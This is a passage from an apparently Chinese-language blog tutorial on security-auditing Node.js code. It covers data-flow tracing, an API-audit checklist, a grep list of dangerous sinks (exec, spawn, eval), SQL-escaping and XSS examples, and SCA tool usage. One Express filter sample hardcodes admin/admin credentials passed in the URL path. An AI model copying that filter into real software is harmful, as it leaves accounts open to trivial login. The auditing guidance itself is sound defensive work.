chunk;<br>    &#125;);<br><br>    <span class="hljs-comment">// 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。</span><br>    req.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        post = querystring.<span class="hljs-title function_">parse</span>(post);<br>        res.<span class="hljs-title function_">end</span>(util.<span class="hljs-title function_">inspect</span>(post));<br>    &#125;);<br>&#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>后端系统通过GET或者POST获取提交的参数，进行逻辑处理，我们按照正向数据流，分析数据是否进行安全处理，逻辑流程是否合理，是否可以导致敏感信息泄露。</p><h4 id="查询api-list"><a href="#查询api-list" class="headerlink" title="查询api list"></a>查询api list</h4><p>通过查看系统对外提供的api接口，确定以下几点：</p><ul><li>接口权限校验<ul><li>审计对外提供服务的接口是否存在权限缺陷，接口如果对互联网开放则需要对接口的使用进行权限验证，如在内部则需要在网络层面对接口服务进行控制。</li></ul></li><li>接口请求频率校验<ul><li>审计对外提供服务接口是否有防滥用机制，例如查询相关信息接口，一方面如果未对接口进行查询次数控制，则会导致大量信息泄露，另一方面，频繁的查询会对服务器性能造成影响如对方频繁恶意进行接口调用，则会导致接口性能下降，影响业务（基于业务的DDOS攻击）。建议进行接口设计时设计接口阈值，对接口访问频率设置阈值，超出设定的访问频率时返回错误码，对超过阈值的请求进行屏蔽及预警，可以一定程度上防止CC攻击。</li></ul></li><li>接口数据格式校验<ul><li>审计对外提供服务接口是否接口数据校验机制，安全的接口应该有数据白名单校验机制，对数据的数据类型，格式，长度、合法性进行校验。白名单校验机制验证数据确保不出现异常数据和注入攻击。</li></ul></li><li>接口防重放<ul><li>审计对外提供服务接口进行交易时，是否防具备防重放措施，防止关键交易被重放，导致业务风险。</li></ul></li><li>接口完整性校验（以系统安全级别及客户需求为准）<ul><li>对外提供服务接口时，是否具备报文签名机制（将时间戳加上报文其他参数再用MD5或SHA-1算法计算哈希值，这个哈希值就是本次请求的签名sign，服务端接收到请求后以同样的算法得到签名，并跟当前的签名进行比对，如果不一样，说明参数被更改过，直接返回错误标识）。签名机制保证了数据不会被篡改。</li></ul></li><li>接口保密性校验（判断传输过程是否进行安全防护）<ul><li>对外提供服务接口时，如在互联网提供接口服务，则应该具备SSL加密保护或者通过VPN通道进行数据传输。如暂时未实现SSL以及VPN，则需要对敏感数据采用秘钥进行加密。</li></ul></li><li>接口数据防泄漏<ul><li>检查对外提供服务接口是否有报错信息隐藏提示，安全的接口，当出现交易报错或者其他异常报错时系统返回报错信息的返回码，避免堆栈信息泄露（包括框架信息、中间件信息）。</li></ul></li></ul><h3 id="逆向数据流分析"><a href="#逆向数据流分析" class="headerlink" title="逆向数据流分析"></a>逆向数据流分析</h3><p>根据敏感函数，逆向追踪参数的传递过程，是代码审计最常用的方法，通过全局检索关键字，关键函数，如：</p><ul><li>sql查询关键字(select、insert、update)</li><li>文件上传下载关键字（upload、download）</li><li>执行系统命令关键字（exec、execSyn、execFile、execFileSync、spawn、spawnSync）</li><li>解析js,导致执行任意命令(eval、setInteval、setTimeout、Function)</li></ul><p>这种方式的有点是只需要检索相应的关键字，即可快熟的挖掘想要的漏洞，具有可定向挖掘、高效、高质量的特点；缺点也很明显，对于系统框架整体把握不准确，对系统了解薄弱，在挖掘系统逻辑漏洞可能存在覆盖不全等问题。</p><h3 id="根据功能点定向分析"><a href="#根据功能点定向分析" class="headerlink" title="根据功能点定向分析"></a>根据功能点定向分析</h3><p>通过特定功能点，分析系统，可能是文件上传、文件下载、富文本编辑、交易、找回密码（密码重置）等功能进行定向分析。</p><ul><li>文件上传：是否限制文件上传的大小，类型，如果未限制，可能存在任意文件上传，如果上传的文件可以被执行，可获取远程服务器权限。</li><li>文件下载：如果系统文件下载功能设计不完善，存在通过拼接路径进行文件下载，可能存在任意文件下载漏洞</li><li>富文本编辑：富文本编辑框可能是审计人员容易忽略的地方，由于富文本编辑框的特性，无法使用全局过滤器进行处理，可能会存在跨站脚本编制漏洞</li><li>交易：对交易的数据未做非负处理，可能存在负值反冲，正负值对冲等风险</li><li>找回密码(密码重置)：找回密码功能可能存在敏感信息泄露，流程跳跃，短信或邮件轰炸，用户名枚举，重置任意账户密码等问题</li><li>…..</li></ul><h3 id="通读全文"><a href="#通读全文" class="headerlink" title="通读全文"></a>通读全文</h3><p>通读全文主要是为了保证审计范围全部被覆盖到，另一点是发现定点分析发现不了的逻辑漏洞。在企业中对自身系统做安全审计，需要了解真个系统的业务逻辑，这样才能挖掘到更多有价值的漏洞。</p><p>通读全文也有一定的技巧，首先需要查看系统的代码架构，比如系统的目录结构，确定系统的架构，判断那些是框架的程序文件，那些是业务的程序文件，那些配置文件。查看是否安全组件，比如：xss等；其次确定系统入口文件，判断数据的正向流向，通过分析系统的业务，查看可导致安全风险的功能点、结合业务导致的逻辑漏洞、研发人员遗漏的功能点等。</p><p>通读全文的好处仙儿意见，可以更好的了解程序的架构以及业务逻辑，能够挖掘到更多高质量的漏洞，缺点也很明显，耗费的时间过长，如果代码编写不规范，对于审计人员来说也是一种折磨。通常甲方会采用这种方式，乙方由于工时任务等因素，在实施的过程中很少采用这种方式，主要还得看项目经理安排，说到这里，得批评某些行业搅屎棍，低价抢代码项目，本来一周的任务，压缩到2天，几十万行的代码两天看完，还得写报告，几十万行小说也得看几天，这种项目个人看法就是昧着良心干活，纯属耍流氓。喷子勿扰，这只是个人观点，不要和我说全部依赖静态代码扫描工具，如果你真做过代码审计，你就会清楚SCA工具的误报有多高，发现漏洞的数量有多低，复核这些漏洞都是需要花费时间的。</p><h2 id="nodejs常见安全控制措施识别"><a href="#nodejs常见安全控制措施识别" class="headerlink" title="nodejs常见安全控制措施识别"></a>nodejs常见安全控制措施识别</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>为了防止SQL注入，可以将SQL中传入参数进行过滤或预编译，而不是直接进行字符串拼接。</p><p>1、使用escape()对查询参数进行转义<br>参数编码方法有如下三个：</p><ul><li>mysql.escape(param)</li><li>connection.escape(param)</li><li>pool.escape(param)</li></ul><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> userId = <span class="hljs-string">&#x27;some user provided value&#x27;</span>;<span class="hljs-comment">//前端传入的userid参数</span><br><span class="hljs-keyword">var</span> sql = <span class="hljs-string">&#x27;SELECT * FROM users WHERE id = &#x27;</span> + connection.<span class="hljs-built_in">escape</span>(userId);<br>connection.<span class="hljs-title function_">query</span>(sql, <span class="hljs-keyword">function</span> (<span class="hljs-params">error, results, fields</span>) &#123;<br>  <span class="hljs-keyword">if</span> (error) <span class="hljs-keyword">throw</span> error;<br>  <span class="hljs-comment">// ...</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>escape()方法转义规则如下：</p><ul><li>Numbers不进行转换；</li><li>Booleans转换为true&#x2F;false；</li><li>Date对象转换为’YYYY-mm-dd HH:ii:ss’字符串；</li><li>Buffers转换为hex字符串，如X’0fa5’；</li><li>Strings进行安全转义；</li><li>Arrays转换为列表，如[‘a’, ‘b’]会转换为’a’, ‘b’；</li><li>多维数组转换为组列表，如[[‘a’, ‘b’], [‘c’, ‘d’]]会转换为’a’, ‘b’), (‘c’, ‘d’)；</li><li>Objects会转换为key&#x3D;value键值对的形式。</li><li>嵌套的对象转换为字符串；</li><li>undefined&#x2F;null会转换为NULL；</li><li>MySQL不支持NaN&#x2F;Infinity，并且会触发MySQL错误。</li></ul><p>2、使用escapeId()对查询标识符进行转义：<br>如果系统不信任用户传入的SQL标识符（数据库、表、字段名），可以使用escapeId()方法进行转义，最常用于排序等场景。escapeId()有如下三种使用方法：</p><ul><li>mysql.escapeId(identifier)</li><li>connection.escapeId(identifier)</li><li>pool.escapeId(identifier)</li></ul><p>例如：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> sorter = <span class="hljs-string">&#x27;date&#x27;</span>;<br><span class="hljs-keyword">var</span> sql    = <span class="hljs-string">&#x27;SELECT * FROM posts ORDER BY &#x27;</span> + connection.escapeId(sorter);<br>connection.query(sql, <span class="hljs-keyword">function</span><span class="hljs-params">(err, results)</span> &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>3、使用占位符进行预编译<br>可使用 ? 做为查询参数占位符。在使用查询参数占位符时，在其内部自动调用 connection.escape() 方法对传入参数进行预编译。</p><p>如：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">connection.query(<span class="hljs-string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>, [userId], function (<span class="hljs-keyword">error</span>, results, fields) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">error</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">error</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>也可以是以下这种查询方式，其中foo值映射为a，bar映射为b,baz映射为c,id映射为userId</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">connection.query(<span class="hljs-string">&#x27;UPDATE users SET foo = ?, bar = ?, baz = ? WHERE id = ?&#x27;</span>, [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, userId], function (<span class="hljs-keyword">error</span>, results, fields) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">error</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">error</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>这个查询方式看起来和mysql的预编译相似，但是只在connection.escape()方法的内部实现类似预编译机制，需要注意的是，与mysql预编译不同的是，所有“？”号均被替换，甚至在注释和参数中的问号也不例外。</p><p>4、预查询<br>使用mysql.format()转义参数，该函数会选择合适的转义方法转义参数 mysql.format()用于准备查询语句。</p><p>例如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">var userId = <span class="hljs-number">1</span>;<br>var <span class="hljs-keyword">sql</span> = &quot;SELECT * FROM ?? WHERE ?? = ?&quot;;<br>var inserts = [<span class="hljs-string">&#x27;users&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>, userId];<br><span class="hljs-keyword">sql</span> = mysql.format(<span class="hljs-keyword">sql</span>, inserts); // <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Node环境下，安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ npm <span class="hljs-keyword">install</span> xss<br></code></pre></td></tr></table></figure><p>然后修改：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> xss = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)<br><span class="hljs-keyword">const</span> inputValue = content  <span class="hljs-comment">// 未进行 xss 防御</span><br><span class="hljs-keyword">const</span> inputValue = <span class="hljs-title function_">xss</span>(content)  <span class="hljs-comment">// 已进行 xss 防御</span><br></code></pre></td></tr></table></figure><p>通过全局检索，是否安装xss依赖库。</p><h3 id="express过滤器"><a href="#express过滤器" class="headerlink" title="express过滤器"></a>express过滤器</h3><p>Express 是一个简洁而灵活的 node.js Web应用框架, 提供了一系列强大特性帮助你创建各种 Web 应用，和丰富的 HTTP 工具，使用 Express 可以快速地搭建一个完整功能的网站。</p><p>Express 框架核心特性：</p><ul><li>可以设置中间件来响应 HTTP 请求。</li><li>定义了路由表用于执行不同的 HTTP 请求动作。</li><li>可以通过向模板传递参数来动态渲染 HTML 页面。</li></ul><p>简单过滤器</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">const express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br>const app = express();<br><br>let filter = <span class="hljs-function"><span class="hljs-params">(req, res, <span class="hljs-built_in">next</span>)</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span>(req.params.name == <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; req.params.pwd == <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-built_in">next</span>()<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">next</span>(<span class="hljs-string">&#x27;用户名密码不正确&#x27;</span>)<br>    &#125;<br>&#125;<br><br>app.get(<span class="hljs-string">&#x27;/:name/:pwd&#x27;</span>, filter, <span class="hljs-function"><span class="hljs-params">(req, res)</span> =&gt;</span> &#123;<br>    res.send(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>&#125;).listen(<span class="hljs-number">88</span>)<br></code></pre></td></tr></table></figure><p>运行规则</p><ul><li>访问 <a href="http://localhost:4000/admin/admin">http://localhost:4000/admin/admin</a></li><li>首先会进入过滤器方法 filter</li><li>next()，不带任选参数，表示会直接进入目标路由，执行路由逻辑</li><li>next(‘’)，带参数，表示不会进入目标路由，并抛出错误。</li></ul><h2 id="常见nodejs-SCA工具"><a href="#常见nodejs-SCA工具" class="headerlink" title="常见nodejs SCA工具"></a>常见nodejs SCA工具</h2><h3 id="NPM-Audit"><a href="#NPM-Audit" class="headerlink" title="NPM Audit"></a>NPM Audit</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p><code>npm audit</code>命令NPM工具提供的用于审计当前依赖组件是否存在安全风险，使用<code>npm install</code>安装依赖库，也会触发安全扫描，会返回当前依赖库存在的安全风险，提示用户进行升级。我们审计不会修改用户的项目数据，但是对于组件的问题，需要提出来，方便研发人员或者其他运维支持部对系统依赖组件进行升级。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>检查依赖组件安全风险</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">$ <span class="hljs-built_in">npm</span> audit<br></code></pre></td></tr></table></figure><p><img src="/img/20200624-nodejs-code-review-02.png" alt="20200624-nodejs-code-review-02.png"></p><p>修复组件安全风险</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">$ <span class="hljs-built_in">npm</span> audit fix<br></code></pre></td></tr></table></figure><h4 id="分析扫描结果"><a href="#分析扫描结果" class="headerlink" title="分析扫描结果"></a>分析扫描结果</h4><pre><code>1、如果组件不依赖应用系统，判断当前组件的安全风险及漏洞利用方式，确定漏洞等级2、如果组件安全风险必须依赖应用系统，判断是否影响应用系统。</code></pre><h3 id="owasp-dependency-check"><a href="#owasp-dependency-check" class="headerlink" title="owasp dependency check"></a>owasp dependency check</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序，用于识别项目依赖项并检查是否存在任何已知的，公开披露的漏洞。目前，已支持Java、.NET、Ruby、Node.js、Python等语言编写的程序，并为C&#x2F;C++构建系统（autoconf和cmake）提供了有限的支持。<br>Dependency-Check支持面广（支持多种语言）、可集成性强，作为一款开源工具，在多年来的发展中已经支持和许多主流的软件进行集成，比如：命令行、Ant、Maven、Gradle、Jenkins、Sonar等；具备使用方便，落地简单等优势。</p><h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><p>dependency check提供windows和linux两种运行方式，用户可以自行下载编译文成的二进制包，也可以下载源代码自行进行编译，方式不固定。</p><p>github地址：<a href="https://github.com/jeremylong/DependencyCheck">https://github.com/jeremylong/DependencyCheck</a><br>dependency 5.3.2下载地址:<a href="https://dl.bintray.com/jeremy-long/owasp/dependency-check-5.3.2-release.zip">https://dl.bintray.com/jeremy-long/owasp/dependency-check-5.3.2-release.zip</a><br>使用方式：<br>在bin目录下面有bat和shell两个脚本，根据操作系统运行对应的脚本</p><p><img src="/img/20200624-nodejs-code-review-03.png" alt="20200624-nodejs-code-review-03.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ .\dependency-<span class="hljs-keyword">check</span>.bat <span class="hljs-comment">--help</span><br><span class="hljs-keyword">usage</span>: Dependency-<span class="hljs-keyword">Check</span> Core [<span class="hljs-comment">--advancedHelp] [--enableExperimental]</span><br>       [<span class="hljs-comment">--exclude &lt;pattern&gt;] [-f &lt;format&gt;] [--failOnCVSS &lt;score&gt;] [-h]</span><br>       [<span class="hljs-comment">--junitFailOnCVSS &lt;score&gt;] [-l &lt;file&gt;] [-n] [-o &lt;path&gt;]</span><br>       [<span class="hljs-comment">--prettyPrint] [--project &lt;name&gt;] [-s &lt;path&gt;] [--suppression</span><br>       &lt;file&gt;] [-v]<br><br>Dependency-<span class="hljs-keyword">Check</span> Core can be used <span class="hljs-keyword">to</span> identify <span class="hljs-keyword">if</span> there are <span class="hljs-keyword">any</span> known CVE<br>vulnerabilities <span class="hljs-keyword">in</span> libraries utilized <span class="hljs-keyword">by</span> an application. Dependency-<span class="hljs-keyword">Check</span><br>Core will automatically <span class="hljs-keyword">update</span> required data <span class="hljs-keyword">from</span> the Internet, such <span class="hljs-keyword">as</span><br>the CVE <span class="hljs-keyword">and</span> CPE data files <span class="hljs-keyword">from</span> nvd.nist.gov.<br><br>    <span class="hljs-comment">--advancedHelp              Print the advanced help message.</span><br>    <span class="hljs-comment">--enableExperimental        Enables the experimental analyzers.</span><br>    <span class="hljs-comment">--exclude &lt;pattern&gt;         Specify an exclusion pattern. This option</span><br>                                can be specified multiple times <span class="hljs-keyword">and</span> it<br>                                accepts Ant style exclusions.<br> -f,<span class="hljs-comment">--format &lt;format&gt;           The report format (HTML, XML, CSV, JSON,</span><br>                                JUNIT, <span class="hljs-keyword">or</span> <span class="hljs-keyword">ALL</span>). The <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> HTML.<br>                                Multiple <span class="hljs-keyword">format</span> parameters can be<br>                                specified.<br>    <span class="hljs-comment">--failOnCVSS &lt;score&gt;        Specifies if the build should be failed if</span><br>                                a CVSS score above a specified <span class="hljs-keyword">level</span> <span class="hljs-keyword">is</span><br>                                identified. The <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>; since the<br>                                CVSS scores are <span class="hljs-number">0</span><span class="hljs-number">-10</span>, <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span> the build<br>                                will never fail.<br> -h,<span class="hljs-comment">--help                      Print this message.</span><br>    <span class="hljs-comment">--junitFailOnCVSS &lt;score&gt;   Specifies the CVSS score that is</span><br>                                considered a failure <span class="hljs-keyword">when</span> generating the<br>                                junit report. The <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0.</span><br> -l,<span class="hljs-comment">--log &lt;file&gt;                The file path to write verbose logging</span><br>                                information.<br> -n,<span class="hljs-comment">--noupdate                  Disables the automatic updating of the CPE</span><br>                                data.<br> -o,<span class="hljs-comment">--out &lt;path&gt;                The folder to write reports to. This</span><br>                                defaults <span class="hljs-keyword">to</span> the <span class="hljs-keyword">current</span> directory. It <span class="hljs-keyword">is</span><br>                                possible <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> this <span class="hljs-keyword">to</span> a specific file<br>                                <span class="hljs-type">name</span> <span class="hljs-keyword">if</span> the <span class="hljs-keyword">format</span> argument <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span><br>                                <span class="hljs-keyword">ALL</span>.<br>    <span class="hljs-comment">--prettyPrint               When specified the JSON and XML report</span><br>                                formats will be pretty printed.<br>    <span class="hljs-comment">--project &lt;name&gt;            The name of the project being scanned.</span><br> -s,<span class="hljs-comment">--scan &lt;path&gt;               The path to scan - this option can be</span><br>                                specified multiple times. Ant style paths<br>                                are supported (e.g. <span class="hljs-string">&#x27;path/**/*.jar&#x27;</span>); <span class="hljs-keyword">if</span><br>                                <span class="hljs-keyword">using</span> Ant style paths it <span class="hljs-keyword">is</span> highly<br>                                recommended <span class="hljs-keyword">to</span> <span class="hljs-keyword">quote</span> the argument <span class="hljs-keyword">value</span>.<br>    <span class="hljs-comment">--suppression &lt;file&gt;        The file path to the suppression XML file.</span><br>                                This can be specified more <span class="hljs-keyword">then</span> once <span class="hljs-keyword">to</span><br>                                utilize multiple suppression files<br> -v,<span class="hljs-comment">--version                   Print the version information.</span><br></code></pre></td></tr></table></figure><p>可根据实际情况，自行构建命令进行扫描,如下:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">.\bin\dependency-check<span class="hljs-selector-class">.bat</span> <span class="hljs-attr">--project</span> Testing <span class="hljs-attr">--out</span> . <span class="hljs-attr">--scan</span> <span class="hljs-selector-attr">[path to  files to be scanned]</span><br></code></pre></td></tr></table></figure><p>注意一点，dependency check扫描nodejs，需要使用<code>node install</code>命令先安装相关依赖包，然后才可以使用dependency check进行扫描</p><h4 id="分析扫描结果-1"><a href="#分析扫描结果-1" class="headerlink" title="分析扫描结果"></a>分析扫描结果</h4><p>dependency check会匹配当前依赖对应的CVE及CWE漏洞，分析这些风险问题，会花费很长时间，建议对高风险以上问题进行分析，确定漏洞是否存在。<br><img src="/img/20200624-nodejs-code-review-04.png" alt="20200624-nodejs-code-review-04.png"></p><h3 id="fortify-sca"><a href="#fortify-sca" class="headerlink" title="fortify sca"></a>fortify sca</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>Fortify SCA 是一个静态的、白盒的源代码安全测试工具。它通过内置的五大主要分析引擎对源代码进行静态的分析和检测，分析的过程中与其特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并整理生成完整的报告。扫描的结果中不但包括详细的安全漏洞的信息，还会有相关的安全知识的说明，并提供相应的修复建议。</p><p>支持常见开发语言的检测和测试，扫描和分析出有安全漏洞和隐患的源代码。支持C&#x2F;C++&#x2F;C#，Java，VB，数据库开发语言Transact-SQL，PL&#x2F;SQL，大型项目和管理平台开发语言COBOL，ColdFusion，ABAP，Flex，脚本语言 JSP，JavaScript&#x2F;Ajax，VBScript，Python，网络和网页开发语言 ASP.NET，VB.NET，ASP，PHP，HTML，以及移动应用开发语言 Android，Objective-C等。</p><h4 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h4><p>fortify sca 扫描nodejs项目，使用以下命令进行构建和扫描，个人感觉对js扫描效果一般</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sourceanalyzer -<span class="hljs-selector-tag">b</span> nodejs -clean<br>sourceanalyzer -<span class="hljs-selector-tag">b</span> nodejs <span class="hljs-selector-attr">[扫描目录]</span> -Dcom<span class="hljs-selector-class">.fortify</span><span class="hljs-selector-class">.sca</span>.EnableDOMModeling=true  -Dcom<span class="hljs-selector-class">.fortify</span><span class="hljs-selector-class">.sca</span><span class="hljs-selector-class">.hoa</span>.Enable=true<br>sourceanalyzer -<span class="hljs-selector-tag">b</span> nodejs -scan -Dcom<span class="hljs-selector-class">.fortify</span><span class="hljs-selector-class">.sca</span><span class="hljs-selector-class">.Phase0HigherOrder</span>.Languages=javascript,typescript -f results.fpr<br></code></pre></td></tr></table></figure><h4 id="分析扫描结果-2"><a href="#分析扫描结果-2" class="headerlink" title="分析扫描结果"></a>分析扫描结果</h4><p>和其他SCA工具分析的思路一样，按照漏洞风险，从高到低，逐条分析。<br><img src="/img/20200624-nodejs-code-review-01.png" alt="fortify scan result analysis"></p><h3 id="nodejsscan"><a href="#nodejsscan" class="headerlink" title="nodejsscan"></a>nodejsscan</h3><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p>NodeJsScan是专门针对Nodejs应用程序静态代码扫描工具。</p><h4 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h4><p>该工具安装的方式有多种，推荐使用容器的方式运行此工具,docker使用方法这里不做阐述。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull opensecurity/nodejsscan:latest<br><span class="hljs-attribute">docker</span> run -it -p <span class="hljs-number">9090</span>:<span class="hljs-number">9090</span> opensecurity/nodejsscan:latest<br></code></pre></td></tr></table></figure><p>访问对应站点，上传被扫描程序</p><p><img src="/img/20200624-nodejs-code-review-05.png" alt="nodejsscan upload file"></p><p>等待片刻，获取扫描结果，进行分析</p><p><img src="/img/20200624-nodejs-code-review-06.png" alt="nodejsscan result"><br><img src="/img/20200624-nodejs-code-review-07.png" alt="nodejsscan result"><br><img src="/img/20200624-nodejs-code-review-08.png" alt="nodejsscan result"><br><img src="/img/20200624-nodejs-code-review-09.png" alt="nodejsscan result"></p><h4 id="分析扫描结果-3"><a href="#分析扫描结果-3" class="headerlink" title="分析扫描结果"></a>分析扫描结果</h4><p>个人感觉nodejsscan对于漏洞识别能力一般，但是还是可以辅助安全人员发现漏洞，毕竟没多少可以用的，有就不错了。</p><h3 id="Retire-js"><a href="#Retire-js" class="headerlink" title="Retire.js"></a>Retire.js</h3><h4 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h4><p>Retire.js通过扫描Web应用程序判断是否使用易受攻击的JavaScript库，可以帮助检测已知漏洞的版本的使用情况。</p><h4 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h4><p>安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ npm <span class="hljs-keyword">install</span> -g retire<br></code></pre></td></tr></table></figure><p><img src="/img/20200624-nodejs-code-review-10.png" alt="retire install"><br>使用：<br>在项目的目录下执行以下指令，即可扫描。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>retire<br></code></pre></td></tr></table></figure><p>具体参数如下：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs ada">λ  npx retire <span 